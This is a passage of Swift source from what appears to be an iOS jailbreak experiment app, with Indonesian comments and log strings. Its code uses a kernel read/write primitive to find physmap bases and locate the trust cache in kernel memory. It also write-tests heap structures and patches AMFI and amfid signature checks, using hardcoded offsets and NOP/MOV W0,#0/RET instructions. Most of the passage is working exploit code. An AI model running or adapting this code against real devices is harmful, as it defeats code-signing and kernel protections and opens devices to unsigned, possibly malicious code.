        let success = postSprayFound || markerFound
        return ExperimentResult(name: "Heap Spray (Exp 73)", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 74: Physmap Direct Access
    
    /// The kernel maintains a 1:1 virtual mapping of ALL physical RAM (physmap).
    /// Formula: physmap_virt = physmap_base + physical_address
    /// If we can find physmap_base, we can read/write ANY physical address
    /// through the kernel's own virtual mapping — bypassing zone isolation!
    ///
    /// Key insight: physmap is in kernel __DATA region, NOT in a PPL-protected zone.
    /// Our socket KRW might be able to read it IF the address falls in our zone.
    /// Alternative: use the known gPhysBase/gVirtBase to calculate.
    ///
    /// On A12 iOS 18.2:
    ///   physmap_base ≈ 0xfffffff000000000 (gVirtBase) - 0x800000000 (gPhysBase) + kernel_base
    ///   OR: physmap is at a fixed offset from kernel base
    /// Pure KRW — no launchd RC, no IOKit/IOSurface (prevents initproc panic).
    private func expPhysmapAccess() -> ExperimentResult {
        var detail = "Experiment 74: Physmap Direct Access (KRW-only, safe)\n"
        detail += "====================================================\n\n"

        // Sudah verified (screenshot lama / run sukses) — jangan ulang probe yang bikin panic/respring
        if PhysmapConstants.isVerified, let saved = PhysmapConstants.load() {
            let kernBase = ds_get_kernel_base()
            let magic = ds_kread64_safe(kernBase)
            let machOk = (magic & 0xFFFFFFFF) == 0xFEEDFACF
            detail += "✅ Sudah verified sebelumnya — skip probe ulang\n"
            detail += "gVirtBase: 0x\(String(format: "%llx", saved.gVirtBase))\n"
            detail += "gPhysBase: 0x\(String(format: "%llx", saved.gPhysBase))\n"
            detail += "KRW __TEXT sekarang: \(machOk ? "OK (0xFEEDFACF)" : "⚠️ cek jailbreak")\n\n"
            detail += "→ Fokus berikutnya: ② Trust Cache Probe (Exp 77)\n"
            detail += "Jangan tap ③ Inject sampai ② hijau.\n"
            return ExperimentResult(name: "Physmap Access (Exp 74)", success: machOk, detail: detail, timestamp: Date())
        }

        let kernBase = ds_get_kernel_base()
        let kernSlide = ds_get_kernel_slide()
        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
        detail += "Kernel slide: 0x\(String(format: "%llx", kernSlide))\n\n"

        let gPhysBase: UInt64 = PhysmapConstants.defaultGPhysBase
        let ourProc = ds_get_our_proc()
        let zoneMapEst = PhysmapConstants.estimateZoneMapBase(ourProc: ourProc)
        detail += "proc: 0x\(String(format: "%llx", ourProc))\n"
        detail += "Zone map (est): 0x\(String(format: "%llx", zoneMapEst))\n"
        detail += "gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n\n"

        // Step 2: Test if socket KRW can read OUTSIDE proc/task zone
        // Key question: is our KRW truly zone-limited, or can it read any kernel VA?
        // Test by reading kernel __TEXT header (Mach-O magic) — different zone from proc
        
        detail += "\n=== Testing KRW zone boundaries ===\n"
        
        // Read kernel Mach-O header (should be 0xFEEDFACF for 64-bit)
        let kernMagic = ds_kread64_safe(kernBase)
        detail += "Kernel base read: 0x\(String(format: "%llx", kernMagic))\n"
        
        let isMachO = (kernMagic & 0xFFFFFFFF) == 0xFEEDFACF
        if isMachO {
            detail += "✅ Kernel Mach-O header readable! (0xFEEDFACF)\n"
            detail += "KRW can read __TEXT segment!\n\n"
        } else if kernMagic == 0 {
            detail += "❌ Kernel base returns 0 — zone-blocked\n\n"
        } else {
            detail += "⚠️ Unexpected value — might be slid or different format\n\n"
        }
        
        // ============================================================
        // PRIMARY: kernproc pmap → tte/ttep (+0x00 or +0x08, PAC stripped)
        // User pmap (our_proc) often has tte=0 at +0x00 — see prior experiments.
        // ============================================================
        var foundPhysBase: UInt64 = 0
        var foundVirtBase: UInt64 = 0

        if let verified = verifyPhysmapSafe(
            kernBase: kernBase,
            kernMagic: kernMagic,
            ourProc: ourProc,
            tte: 0,
            detail: &detail
        ) {
            foundVirtBase = verified.gVirtBase
            foundPhysBase = verified.gPhysBase
        }

        let success = foundPhysBase != 0 && foundVirtBase != 0
        return ExperimentResult(name: "Physmap Access (Exp 74)", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 77: Trust Cache Probe (safe) + Inject (physmap)

    /// Fast kernelcache-guided probe: symtab → few __DATA slots → optional short fallback.
    private func expTrustCacheProbeSafe() -> ExperimentResult {
        let expName = "Trust Cache Probe (Exp 77)"
        var detail = "Experiment 77: Trust Cache Probe (read-only, KRW-safe)\n"
        detail += "====================================================\n\n"
        detail += "Mode: offline kernelcache ADRP + KRW aman (analyze_kernelcache.py di device)\n\n"

        guard PhysmapConstants.isVerified else {
            detail += "❌ Jalankan Physmap Access (Exp 74) dulu.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        PhysmapConstants.clearProbeOK()

        let physmap = PhysmapConstants.loadOrDefault()
        let kernBase = ds_get_kernel_base()
        let kernSlide = ds_get_kernel_slide()
        detail += "gVirtBase: 0x\(String(format: "%llx", physmap.gVirtBase)) (saved)\n"
        detail += "gPhysBase: 0x\(String(format: "%llx", physmap.gPhysBase))\n"
        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
        detail += "Kernel slide: 0x\(String(format: "%llx", kernSlide))\n\n"

        let fileDataOffForBase = ds_kcache_analyze_data_offset()
        let dataOff = fileDataOffForBase != 0 ? fileDataOffForBase : PhysmapConstants.dataOffsetFromText
        let dataSegBase = kernBase &+ dataOff
        let pplDataBase = dataSegBase &+ PhysmapConstants.pplDataOffsetFromData
        detail += "__DATA: 0x\(String(format: "%llx", dataSegBase))\n"
        detail += "__DATA.__ppl_data: 0x\(String(format: "%llx", pplDataBase)) (TIDAK dibaca — PPL panic)\n"

        let offlineSlotCount = ds_kcache_trust_slot_count()
        let fileDataOff = fileDataOffForBase
        detail += "\n=== Offline kernelcache scan ===\n"
        detail += "  ADRP slots: \(offlineSlotCount) (dari file Documents/kernelcache)\n"
        if fileDataOff != 0 {
            detail += "  dataOffsetFromText: 0x\(String(format: "%llx", fileDataOff))"
            if fileDataOff != PhysmapConstants.dataOffsetFromText {
                detail += " (builtin 0x\(String(format: "%llx", PhysmapConstants.dataOffsetFromText)))"
            }
            detail += "\n"
        }
        if offlineSlotCount == 0 {
            detail += "  ⚠️ Jalankan Import/Verifikasi kernelcache dulu (Settings).\n"
        }
        detail += "\n"

        var probeOffsets: [UInt64] = []
        if offlineSlotCount > 0 {
            for i in 0..<offlineSlotCount {
                let off = ds_kcache_trust_slot_at(i)
                if off != 0 { probeOffsets.append(off) }
            }
        }
        if probeOffsets.isEmpty {
            probeOffsets = PhysmapConstants.trustCacheFastOffsetsInData
        }

        var tcStructAddr: UInt64 = 0
        var tcEntryCount: UInt64 = 0
        var krwBudget = 512

        func spendKRW() -> Bool {
            if krwBudget <= 0 { return false }
            krwBudget -= 1
            return true
        }

        func readU32(_ va: UInt64) -> UInt32 {
            if isSafeKernelHeapKreadAddress(va) { return safeKread32Heap(va) }
            return safeKread32Kernel(va)
        }

        func trustCacheHeaderAt(_ va: UInt64, headerOff: UInt64 = 0) -> (UInt32, UInt32)? {
            guard spendKRW(),
                  isSafeTrustCacheStructVA(va, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase)
            else { return nil }
            let base = va &+ headerOff
            let ver = readU32(base)
            let cnt = readU32(base + 4)
            // count >= 5: trust cache sistem selalu punya banyak entry
            // count < 5 = false positive (struct lain yang kebetulan lolos)
            guard cnt >= 5 && cnt < 500_000 else { return nil }
            if ver >= 1 && ver <= 16 { return (ver, cnt) }
            return nil
        }

        func tryTrustCacheAt(_ val: UInt64, label: String) -> Bool {
            for hdrOff: UInt64 in [0, 8, 0x10, 0x18, 0x20] {
                if let (tcVer, tcCnt) = trustCacheHeaderAt(val, headerOff: hdrOff) {
                    let hdrVA = val &+ hdrOff
                    guard trustCacheEntriesPlausible(
                        hdrVA: hdrVA, count: tcCnt,
                        dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase
                    ) else {
                        detail += "  (abaikan \(label)+0x\(String(format: "%x", hdrOff)): ver=\(tcVer) cnt=\(tcCnt) — entry[0] bukan CDHash)\n"
                        continue
                    }
                    let kind = isSafeKernelHeapKreadAddress(val) ? "heap" : "__DATA"
                    detail += "🎯 Trust cache \(label) (\(kind))!\n"
                    detail += "  addr: 0x\(String(format: "%llx", hdrVA))\n"
                    detail += "  version: \(tcVer), count: \(tcCnt)\n"
                    tcStructAddr = hdrVA
                    tcEntryCount = UInt64(tcCnt)
                    return true
                }
            }
            guard isLikelyKernelObjectPointer(val),
                  isSafeTrustCacheFollowPointer(val, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase)
                || isLikelyTrustCacheHeapPointer(val, kernTextBase: kernBase)
            else { return false }
            guard spendKRW() else { return false }
            let inner = ds_kreadptr(val)
            guard inner != 0, inner != val, isLikelyKernelObjectPointer(inner),
                  isSafeTrustCacheFollowPointer(inner, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase)
            else { return false }
            return tryTrustCacheAt(inner, label: "\(label)→deref")
        }

        func probeGlobalSlot(_ off: UInt64, label: String) {
            let addr = dataSegBase &+ off
            guard isSafeTrustCacheStructVA(addr, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase)
            else { return }
            if off != PhysmapConstants.pmapCsAllowInvalidOffsetInData {
                if tryTrustCacheAt(addr, label: "\(label)@inline") { return }
            }
            guard spendKRW() else { return }
            let raw = safeKread64Kernel(addr)
            let val = ds_kreadptr(addr)
            let use = val != 0 ? val : raw
            guard isLikelyKernelObjectPointer(use) else { return }
            if tryTrustCacheAt(use, label: label) { return }
            if isSafeTrustCacheFollowPointer(use, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase),
               spendKRW() {
                let smr = ds_kreadsmrptr(addr)
                if smr != 0, smr != use, isLikelyKernelObjectPointer(smr) {
                    _ = tryTrustCacheAt(smr, label: "\(label)→smr")
                }
            }
        }

        detail += "=== Symtab / XPF globals ===\n"
        let symProbeNames = [
            "_trustcache",
            "_static_trust_cache",
            "_loaded_trust_caches",
            "kernelSymbol.trust_cache",
        ]
        for sym in symProbeNames {
            var rt = ds_kcache_symbol_runtime(sym)
            if rt == 0 { rt = ds_xpf_resolve_runtime(sym) }
            if rt == 0 {
                detail += "  \(sym): (not found)\n"
                continue
            }
            detail += "  \(sym): 0x\(String(format: "%llx", rt))\n"
            if tryTrustCacheAt(rt, label: sym) { break }
            if spendKRW() {
                let p = ds_kreadptr(rt)
                if isLikelyKernelObjectPointer(p) {
                    if tryTrustCacheAt(p, label: "\(sym)→ptr") { break }
                }
            }
        }
        detail += "\n"

        var orderedOffsets = probeOffsets
        // Prioritas berdasarkan analisis offline (analyze_kernelcache.py --deep-probe):
        // 0x39b0 dan 0x38a0 = slot yang di-STR oleh kode kernel (trust_cache_init area)
        // 0x3980, 0x3920, 0x3930 = ADRP refs tinggi dari AMFI code
        let priority: [UInt64] = [
            0x39b0, 0x38a0,           // ← STR target dari kernel init code (highest priority)
            0x3980, 0x3920, 0x3930,   // ← ADRP refs tinggi
            0x38e0, 0x38c0, 0x38b0, 0x3900,
            0x2d0, 0x1a4, 0x2770, 0x1f8,
        ]
        orderedOffsets.sort { a, b in
            let pa = priority.firstIndex(of: a) ?? 999
            let pb = priority.firstIndex(of: b) ?? 999
            if pa != pb { return pa < pb }
            return a < b
        }
        orderedOffsets.removeAll { $0 == PhysmapConstants.pmapCsAllowInvalidOffsetInData }

        detail += "=== Probe __DATA (\(orderedOffsets.count) slot, pre-PPL) ===\n"
        for off in orderedOffsets {
            probeGlobalSlot(off, label: "kc+0x\(String(format: "%x", off))")
            if tcStructAddr != 0 { break }
        }

        if tcStructAddr == 0 {
            detail += "\n=== Pointer di global __DATA (read-only) ===\n"
            for off in probeOffsets.prefix(8) {
                let addr = dataSegBase &+ off
                guard isSafeTrustCacheStructVA(addr, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase) else { continue }
                let p = ds_kreadptr(addr)
                let raw = safeKread64Kernel(addr)
                let show = p != 0 ? p : raw
                var tag: String
                if show == 0 { tag = "null" }
                else if isSafeKernelHeapKreadAddress(show) { tag = "heap?" }
                else if show >= dataSegBase && show < pplDataBase { tag = "__DATA" }
                else if isFilesetAuxDataVA(show, kernTextBase: kernBase, dataSegBase: dataSegBase) { tag = "fileset aux" }
                else if show >= kernBase && show < dataSegBase { tag = "__TEXT? (skip)" }
                else { tag = "?" }
                if p == 0 && raw != 0 { tag += " raw" }
                detail += "  kc+0x\(String(format: "%x", off)): 0x\(String(format: "%llx", show)) (\(tag))\n"
            }
        }

        if tcStructAddr == 0 {
            detail += "\n=== Scan fileset aux (pointer dari slot) ===\n"
            var auxSeen = Set<UInt64>()
            for off in orderedOffsets.prefix(16) {
                let addr = dataSegBase &+ off
                guard spendKRW() else { break }
                let p = ds_kreadptr(addr)
                guard isLikelyKernelObjectPointer(p),
                      isFilesetAuxDataVA(p, kernTextBase: kernBase, dataSegBase: dataSegBase),
                      auxSeen.insert(p).inserted
                else { continue }
                detail += "  follow aux 0x\(String(format: "%llx", p))\n"
                if tryTrustCacheAt(p, label: "aux") { break }
            }
        }

        // === Heap deep scan: ikuti pointer dari __DATA ke heap, lalu scan +0..+0x80 ===
        // Trust cache iOS 18 sering ada di heap (kalloc), bukan inline __DATA.
        // Pointer di __DATA → heap object → trust cache struct di dalam object itu.
        if tcStructAddr == 0 {
            detail += "\n=== Heap deep scan (pointer __DATA → heap object) ===\n"
            var heapSeen = Set<UInt64>()
            for off in orderedOffsets.prefix(24) {
                guard tcStructAddr == 0 else { break }
                let addr = dataSegBase &+ off
                guard spendKRW() else { break }
                let p = ds_kreadptr(addr)
                guard isLikelyKernelObjectPointer(p),
                      isSafeKernelHeapKreadAddress(p),
                      heapSeen.insert(p).inserted
                else { continue }
                // Scan +0x00..+0x80 dari heap object untuk cari trust cache header
                for innerOff: UInt64 in [0, 8, 0x10, 0x18, 0x20, 0x28, 0x30, 0x40, 0x48, 0x50, 0x60, 0x70, 0x80] {
                    guard spendKRW() else { break }
                    let candidate = p &+ innerOff
                    guard isSafeKernelHeapKreadAddress(candidate) else { continue }
                    if tryTrustCacheAt(candidate, label: "heap+0x\(String(format: "%x", innerOff))@kc+0x\(String(format: "%x", off))") {
                        break
                    }
                    // Juga ikuti pointer di dalam heap object
                    let inner = ds_kreadptr(candidate)
                    guard isLikelyKernelObjectPointer(inner),
                          isSafeKernelHeapKreadAddress(inner),
                          inner != p
                    else { continue }
                    if tryTrustCacheAt(inner, label: "heap→inner@kc+0x\(String(format: "%x", off))") { break }
                }
            }
        }

        guard tcStructAddr != 0 else {
            detail += "\n❌ Struct trust cache tidak ditemukan.\n"
            detail += "Kernelcache OK (\(offlineSlotCount) slot). Perbaikan band KRW 0xffffff80… aktif.\n"
            detail += "Jika masih gagal: Import ulang kernelcache + Jailbreak, kirim log slot di atas.\n"
            detail += "Jangan tap ③ Inject.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        func tcRead64(_ va: UInt64) -> UInt64 {
            isSafeKernelHeapKreadAddress(tcStructAddr) ? safeKread64Heap(va) : safeKread64Kernel(va)
        }
        func tcRead32(_ va: UInt64) -> UInt32 {
            isSafeKernelHeapKreadAddress(tcStructAddr) ? safeKread32Heap(va) : safeKread32Kernel(va)
        }

        // === Raw struct dump (64 bytes) — untuk diagnosa layout iOS 18 ===
        if isSafeTrustCacheStructVA(tcStructAddr, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase) {
            detail += "\n=== Raw struct dump (64 bytes dari tcStructAddr) ===\n"
            for dumpOff in stride(from: UInt64(0), to: 64, by: 8) {
                let dumpVA = tcStructAddr &+ dumpOff
                guard isSafeTrustCacheStructVA(dumpVA, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase) else { break }
                let val = tcRead64(dumpVA)
                detail += "  +0x\(String(format: "%02x", dumpOff)): 0x\(String(format: "%016llx", val))\n"
            }
            detail += "\n"
        }

        // === Sample entries (KRW, max 3) — coba berbagai stride ===
        if isSafeTrustCacheStructVA(tcStructAddr, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase),
           tcEntryCount > 0 {
            detail += "=== Sample entries (KRW, max 3) ===\n"
            // iOS 18 trust cache entry: kemungkinan 24 bytes (CDHash 20B + hashType 1B + flags 1B + pad 2B)
            // atau 32 bytes. Coba stride 24 dan 32.
            for stride in [UInt64(24), UInt64(32), UInt64(22)] {
                let entriesStart = tcStructAddr &+ 8
                guard isSafeTrustCacheStructVA(entriesStart, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase) else { break }
                detail += "  [stride=\(stride)]:\n"
                for i in 0..<min(3, Int(tcEntryCount)) {
                    let entryAddr = entriesStart &+ UInt64(i) * stride
                    guard isSafeTrustCacheStructVA(entryAddr &+ 16, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase) else { break }
                    let h0 = tcRead64(entryAddr)
                    let h1 = tcRead64(entryAddr &+ 8)
                    let h2 = tcRead32(entryAddr &+ 16)
                    detail += "    [\(i)] 0x\(String(format: "%016llx", h0)) 0x\(String(format: "%016llx", h1)) 0x\(String(format: "%08x", h2))\n"
                }
            }
        }

        detail += "\n✅ PROBE OK — trust cache ditemukan (tanpa physmap read).\n"
        detail += "Lanjut ke ③ Write Test untuk verifikasi apakah __DATA bisa ditulis via KRW.\n"
        PhysmapConstants.markProbeOK()

        // Simpan hasil probe ke state untuk dipakai Exp 79
        let savedAddr = tcStructAddr
        let savedCount = UInt32(tcEntryCount)
        DispatchQueue.main.async {
            self.probedTCAddr = savedAddr
            self.probedTCCount = savedCount
            self.probedTCStride = 24  // default; update jika stride 32 terbukti lebih baik
        }

        return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 81: Heap TC Analysis
    
    private func expHeapTCAnalysis() -> ExperimentResult {
        let expName = "Heap TC Analysis (Exp 81)"
        var detail = "Experiment 81: Heap Pointer Analysis\n"
        detail += "=====================================\n\n"

        guard PhysmapConstants.isVerified else {
            return ExperimentResult(name: expName, success: false, detail: "Jalankan Physmap Access (Exp 74) dulu.", timestamp: Date())
        }

        let kernBase = ds_get_kernel_base()
        let dataOff = ds_kcache_analyze_data_offset() != 0 ? ds_kcache_analyze_data_offset() : PhysmapConstants.dataOffsetFromText
        let dataSegBase = kernBase &+ dataOff
        
        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
        detail += "__DATA base: 0x\(String(format: "%llx", dataSegBase))\n\n"

        let targetOffsets: [UInt64] = [0x39b0, 0x38a0]
        var foundHeapStructs = 0
        
        for off in targetOffsets {
            let addr = dataSegBase &+ off
            // Read pointer
            let ptr = ds_kreadptr(addr)
            detail += "kc+0x\(String(format: "%x", off)) (0x\(String(format: "%llx", addr))):\n"
            detail += "  -> 0x\(String(format: "%llx", ptr))\n"
            
            if isSafeKernelHeapKreadAddress(ptr) {
                detail += "  ✅ Pointer menunjuk ke Heap!\n"
                // Analyze what is at the heap pointer
                let ver = safeKread32Heap(ptr)
                let cnt = safeKread32Heap(ptr &+ 4)
                let nextPtr = safeKread64Heap(ptr &+ 0x10)
                
                detail += "  Header [ver=\(ver), cnt=\(cnt)]\n"
                detail += "  Next ptr: 0x\(String(format: "%llx", nextPtr))\n"
                
                if (ver >= 1 && ver <= 16) || (cnt >= 1 && cnt <= 500_000) {
                    detail += "  🎯 Ini kemungkinan besar Trust Cache struct di Heap!\n"
                    foundHeapStructs += 1
                    
                    detail += "\n  Coba Write Test di Heap struct (+0x18 UUID field)...\n"
                    let testAddr = ptr &+ 0x18
                    let original = safeKread64Heap(testAddr)
                    let sentinel: UInt64 = 0xdeadbeefcafebabe
                    
                    ds_kwrite64(testAddr, sentinel)
                    let verify = safeKread64Heap(testAddr)
                    if verify == sentinel {
                        detail += "  ✅ Write Test SUKSES! (KTRR tidak memblokir Heap)\n"
                        // Restore
                        ds_kwrite64(testAddr, original)
                    } else {
                        detail += "  ❌ Write Test GAGAL! (Nilai tidak berubah)\n"
                    }
                } else {
                    detail += "  ⚠️ Header tidak cocok dengan trust cache.\n"
                }
            } else if ptr == 0 {
                detail += "  ⚠️ Nilai 0. (Belum ada dynamic trust cache yang diload)\n"
            } else {
                detail += "  ⚠️ Bukan pointer heap (kemungkinan __DATA atau mati).\n"
            }
            detail += "\n"
        }
        
        detail += "KESIMPULAN:\n"
        if foundHeapStructs > 0 {
            detail += "Berhasil menemukan Heap Trust Cache. Injeksi via KRW bisa dilakukan tanpa KTRR panic!\n"
        } else {
            detail += "Tidak ada Heap Trust Cache yang aktif. Pancing dengan mount Developer Disk Image / aplikasi lain.\n"
        }
        
        return ExperimentResult(name: expName, success: foundHeapStructs > 0, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 82: Deep Trust Cache Scan
    
    private func runExp82DeepTCScan() {
        isRunning = true
        runningLabel = "Deep TC Scan"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expDeepTCScan()
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
    }

    // MARK: - Exp 83: CS Flags Bypass via Physmap

    /// Exp 83: Modifikasi cs_flags di proc_ro binary target via physmap VA.
    /// Physmap bypass KTRR karena physmap adalah mapping berbeda dari physical memory yang sama.
    /// Tidak perlu RC/launchd — pure KRW.
    private func runExp83CSFlagsBypass() {
        isRunning = true
        runningLabel = "CS Flags"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expCSFlagsBypass(targetBinary: self.customBinary)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
    }

    // MARK: - Exp 84: amfid Patch via Physmap

    /// Exp 84 v2: Patch amfid via launchd RC + task_for_pid.
    /// Hardcoded offsets dari on-device analysis (Dump amfid).
    /// Semua 13 BL+CBNZ W0 mengarah ke fungsi yang sama (0x10001c830) = signature check.
    /// Patch: NOP semua CBNZ W0 → amfid selalu lanjut (skip error branch).
    private func runExp84AmfidPatch() {
        isRunning = true
        runningLabel = "amfid"
        guard mgr.rcready else {
            isRunning = false
            runningLabel = ""
            return
        }

        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "exp84_amfid_patch") { rc in
            let result = self.expAmfidPatchV2(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    // MARK: - Exp 85: Kernel AMFI Patch via Physmap

    /// Exp 85: Patch kernel AMFI function langsung via physmap.
    /// Tidak perlu page table walk — kernel VA langsung convert ke physmap VA.
    /// Formula: physmapVA = kernVA - gVirtBase + gPhysBase
    /// Target: hot function yang dipanggil 19x (signature check utama).
    private func runExp85KernelAmfiPatch() {
        isRunning = true
        runningLabel = "Kern AMFI"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expKernelAmfiPatch()
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
    }

    /// Exp 85: Patch kernel AMFI signature check function via physmap write.
    ///
    /// Dari kernelcache analysis (find_amfi_kernel_patch.py):
    ///   - __TEXT_EXEC base (unslid): 0xfffffff007d90000
    ///   - Hot function +0x2ed54: dipanggil 19x (signature check utama)
    ///   - Hot function +0xd9508: dipanggil 15x
    ///   - Prologue: 0xd503237f (PACIBSP)
    ///
    /// Patch: MOV W0, #0 (0x52800000) + RET (0xD65F03C0) di prologue
    /// → fungsi selalu return 0 (allow) → AMFI skip signature check
    ///
    /// Kenapa ini bisa bypass KTRR:
    ///   - KTRR protect kernel VA mapping (0xfffffff0...)
    ///   - Physmap adalah BERBEDA VA mapping ke physical memory yang sama
    ///   - Write via physmap VA MUNGKIN bypass KTRR (tergantung AMCC config)
    ///   - Exp 79 gagal write ke __DATA via KRW langsung (bukan physmap)
    ///   - Physmap write ke heap BERHASIL (Exp 81) — heap bukan KTRR
    ///   - __TEXT_EXEC mungkin punya proteksi berbeda dari __DATA
    private func expKernelAmfiPatch() -> ExperimentResult {
        let expName = "Kernel AMFI Patch (Exp 85)"
        var detail = "Experiment 85: Kernel AMFI Patch via Physmap\n"
        detail += "=============================================\n\n"

        guard let physmap = PhysmapConstants.load() else {
            detail += "❌ Physmap constants tidak tersedia.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        let gVirtBase = physmap.gVirtBase
        let gPhysBase = physmap.gPhysBase
        let kernBase = ds_get_kernel_base()
        let kernSlide = ds_get_kernel_slide()

        detail += "gVirtBase: 0x\(String(format: "%llx", gVirtBase))\n"
        detail += "gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n"
        detail += "kernBase: 0x\(String(format: "%llx", kernBase))\n"
        detail += "kernSlide: 0x\(String(format: "%llx", kernSlide))\n\n"

        // ── Offsets dari kernelcache analysis ─────────────────────────
        // __TEXT_EXEC unslid base: 0xfffffff007d90000
        // Runtime: unslidAddr + kernSlide
        let unslidTextExec: UInt64 = 0xfffffff007d90000

        // Hot functions (patch prologue → always return 0)
        let hotFuncOffsets: [(offset: UInt64, calls: Int, desc: String)] = [
            (0x2ed54, 19, "signature check utama (19x)"),
            (0xd9508, 15, "secondary check (15x)"),
            (0xd9f74, 7, "tertiary check (7x)"),
        ]

        // CBNZ W0 patch targets (NOP individual branch)
        let cbnzOffsets: [UInt64] = [
            0x15c8c, 0x1797c, 0x17b48, 0x17c40, 0x18684,
            0x189d4, 0x18fe4, 0x190ec, 0x1925c, 0x1947c,
        ]

        let NOP: UInt32 = 0xD503201F
        let MOV_W0_0: UInt32 = 0x52800000
        let RET: UInt32 = 0xD65F03C0

        // ── Step 1: Hitung runtime address dan physmap VA ─────────────
        detail += "=== Step 1: Compute addresses ===\n"

        // Runtime __TEXT_EXEC base = unslid + slide
        let runtimeTextExec = unslidTextExec &+ kernSlide
        detail += "__TEXT_EXEC runtime: 0x\(String(format: "%llx", runtimeTextExec))\n"

        // Verify: baca prologue fungsi pertama via KRW langsung
        let hotFunc0VA = runtimeTextExec &+ hotFuncOffsets[0].offset
        let hotFunc0Read = ds_kread32_safe(hotFunc0VA)
        detail += "Hot func[0] VA: 0x\(String(format: "%llx", hotFunc0VA))\n"
        detail += "Hot func[0] read (KRW): 0x\(String(format: "%08x", hotFunc0Read))\n"

        // Expected: 0xd503237f (PACIBSP) — dari kernelcache analysis
        if hotFunc0Read == 0xd503237f {
            detail += "✅ Prologue match! (PACIBSP)\n\n"
        } else if hotFunc0Read == 0 {
            detail += "❌ KRW read returned 0 — address mungkin tidak accessible\n\n"
        } else {
            detail += "⚠️ Prologue berbeda: 0x\(String(format: "%08x", hotFunc0Read)) (expected 0xd503237f)\n"
            detail += "Mungkin offset salah atau kernelcache berbeda versi.\n\n"
        }

        // ── Step 2: Physmap VA computation ────────────────────────────
        detail += "=== Step 2: Physmap VA ===\n"

        // Formula: physmapVA = kernVA - gVirtBase + gPhysBase
        // TAPI: gVirtBase adalah base physmap (0xffffffdc00000000)
        // Kernel VA (0xfffffff0...) BUKAN di physmap range!
        // Yang benar: physical address kernel = kernVA - kernel_virt_base + kernel_phys_base
        // kernel_phys_base = gPhysBase + (kernBase - gVirtBase)... ini circular
        //
        // Sebenarnya: physmap maps ALL physical RAM starting at gVirtBase
        // Kernel text physical address = kernVA - KERNEL_VIRT_BASE + KERNEL_PHYS_OFFSET
        // Pada A12: kernel loaded at physical 0x800004000 (gPhysBase + 0x4000)
        // kernel_base virtual (unslid) = 0xfffffff007004000
        // Jadi: phys = kernVA - 0xfffffff007004000 + 0x800004000
        //       physmapVA = phys - gPhysBase + gVirtBase
        //       = kernVA - 0xfffffff007004000 + 0x800004000 - 0x800000000 + gVirtBase
        //       = kernVA - 0xfffffff007004000 + 0x4000 + gVirtBase
        //       = kernVA - 0xfffffff007000000 + gVirtBase
        //
        // Simpler: physmapVA = kernVA - unslidKernBase + gVirtBase + (kernPhysOffset - gPhysBase)
        // Tapi kita tidak tahu kernPhysOffset pasti.
        //
        // PALING SIMPEL: coba langsung kernVA sebagai physmap target
        // Karena gVirtBase = 0xffffffdc00000000 dan kernVA = 0xfffffff0...
        // kernVA BUKAN di physmap range (0xffffffdc-0xffffffe5)
        // Jadi kita HARUS convert ke physical dulu.
        //
        // Physical address kernel text:
        //   phys = (kernVA - kernBase) + kernPhysBase
        //   kernPhysBase biasanya = gPhysBase + (kernBase_unslid - gVirtBase_for_kernel)
        //   Tapi ini terlalu complex. Pakai approach berbeda:
        //
        // APPROACH: Baca kernel page table (kita sudah punya kernel pmap dari Exp 74!)
        // Atau: hitung dari panic log.
        // Dari panic.txt: kernelcache slide = 0x0c0e8000
        //   kernel text exec base = 0xfffffff013e78000
        //   unslid text exec = 0xfffffff007d90000
        //   slide = 0x0c0e8000 ✓
        //
        // Physical address = VA - TTBR1_base + phys_base
        // Pada A12 iOS 18: TTBR1 maps kernel at physical offset
        // Dari Exp 74: gVirtBase maps physmap. Kernel text BUKAN di physmap.
        //
        // CORRECT FORMULA:
        // Kernel text physical = kernVA - kernBase + (kernBase_phys)
        // kernBase_phys = kita tidak tahu langsung, TAPI:
        // Dari physmap perspective: jika kita tahu physical address,
        // physmapVA = phys - gPhysBase + gVirtBase
        //
